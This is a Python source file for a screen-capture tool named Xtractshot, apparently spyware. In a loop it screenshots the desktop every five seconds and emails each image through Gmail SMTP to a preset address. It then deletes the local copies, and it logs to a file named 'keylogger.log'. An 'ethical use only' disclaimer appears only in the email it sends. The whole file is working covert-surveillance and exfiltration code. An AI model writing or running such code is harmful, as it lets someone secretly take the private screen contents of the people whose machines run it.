import os
import time
import logging
import smtplib
import sys
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from PIL import ImageGrab

# Configuration
email_address = " "  # Enter your email here
password = " " # Enter your email password here
toaddr = " "  # Enter the email address you want to send your information to
file_path = r" " # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = os.path.join(file_path, extend)
screenshot_information = "screenshot.png"
interval = 5  # Interval in seconds for taking screenshots

# Set up logging
logging.basicConfig(
    filename=os.path.join(file_merge, 'keylogger.log'),
    level=logging.INFO,
    format='%(asctime)s:%(levelname)s:%(message)s'
)

def screenshot():
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    screenshot_filename = os.path.join(file_merge, f"screenshot_{timestamp}.png")
    try:
        im = ImageGrab.grab()
        im.save(screenshot_filename)
        return screenshot_filename
    except Exception as e:
        logging.error(f"Failed to capture screenshot: {e}")
        return None

def send_email(subject, body, attachment_path, toaddr):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = toaddr
    msg['Subject'] = subject

    body_html = f"""
    <html>
      <body style="font-family: monospace; background-color: #121212; color: #0ef; padding: 30px; text-align: center;">
        <div style="border: 2px solid #0ef; padding: 20px; border-radius: 10px; max-width: 600px; margin: auto;">
          <h2 style="color: #0ef;">Xtractshot</h2>
          <p><b>Execution Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
          <p>This email contains a screenshot captured using the <b>Xtractshot</b> tool developed by <b>X3NIDE</b>.</p>
          <hr style="border-color: #0ef; margin: 20px 0;">
          <p><b>Usage Notice:</b></p>
          <ul style="text-align: left; color: #e0e0e0; padding-left: 30px;">
            <li><b>Ethical Use Only:</b> This tool is designed for ethical hacking purposes, such as system auditing, with proper consent.</li>
            <li><b>Legal Compliance:</b> Ensure compliance with local laws, regulations, and privacy standards when using this tool.</li>
            <li><b>No Unauthorized Activities:</b> Any unauthorized use of this tool for malicious intent is strictly prohibited and punishable by law.</li>
          </ul>
          <p style="color: #0ef; font-size: 12px;">Make sure your usage complies with ethical hacking standards.</p>
          <hr style="border-color: #0ef; margin: 20px 0;">
          {'' if not attachment_path else f'<p style="color: #e0e0e0;"><b>Attached Screenshot:</b> {os.path.basename(attachment_path)}</p>'} <br> 
          <a href="https://github.com/mubbashirulislam/Xtractshot.git" style="color: #0ef; text-decoration: none; border: 1px solid #0ef; padding: 10px 15px; border-radius: 5px;">Visit Xtractshot</a> <br>
        
        </div>
      </body>
    </html>
    """

    msg.attach(MIMEText(body_html, 'html'))

    if attachment_path:
        try:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(open(attachment_path, 'rb').read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment_path)}"')
            msg.attach(part)
            logging.info(f"Attached file: {attachment_path}")
        except Exception as e:
            logging.error(f"Failed to attach file {attachment_path}: {e}")

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(email_address, password)
            server.sendmail(email_address, toaddr, msg.as_string())
        logging.info(f"Email sent successfully{' with attachment ' + attachment_path if attachment_path else ' without attachment'}")
        print(f"Email sent successfully{' with attachment ' + attachment_path if attachment_path else ' without attachment'}")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")
        print(f"Failed to send email: {e}")

def delete_local_files(file_path):
    try:
        os.remove(file_path)
        logging.info(f"Deleted file: {file_path}")
        print(f"Deleted file: {file_path}")
    except Exception as e:
        logging.error(f"Failed to delete file {file_path}: {e}")
        print(f"Failed to delete file {file_path}: {e}")

def main():
    logging.info("Xtractshot by X3NIDE started")
    send_email("Xtractshot by X3NIDE", "The Xtractshot has started.", None, toaddr)
    try:
        while True:
            screenshot_filename = screenshot()
            if screenshot_filename:
                send_email("New Xtractshot Available by X3NIDE", "", screenshot_filename, toaddr)
                delete_local_files(screenshot_filename)
            time.sleep(interval)
    except KeyboardInterrupt:
        logging.info("Xtractshot by X3NIDE stopped by user")
        send_email("Xtractshot by X3NIDE Stopped", "The Xtractshot has stopped.", None, toaddr)
    except Exception as e:
        logging.error(f"An error occurred in Xtractshot by X3NIDE: {e}")
        send_email("Xtractshot by X3NIDE Error", f"An error occurred: {e}", None, toaddr)
        print(f"An error occurred in Xtractshot by X3NIDE: {e}", file=sys.stderr)

if __name__ == "__main__":
    main()